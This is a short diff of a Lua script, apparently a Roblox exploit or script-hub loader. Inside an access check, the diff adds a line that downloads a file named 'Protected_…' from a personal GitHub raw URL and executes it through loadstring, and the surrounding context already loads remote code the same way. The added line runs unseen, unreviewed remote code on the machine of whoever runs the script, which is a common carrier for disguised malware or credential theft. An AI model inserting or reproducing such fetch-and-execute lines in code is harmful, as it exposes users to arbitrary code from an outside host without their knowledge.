@@ -4,6 +4,9 @@ local free_access = loadstring(game:HttpGet("https://raw.githubusercontent.com/k
 
 if free_access == true then
 
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aa8283/i/refs/heads/main/Protected_2547730226887233.txt"))() 
+
 --[[
 
     ///////////////////////////////
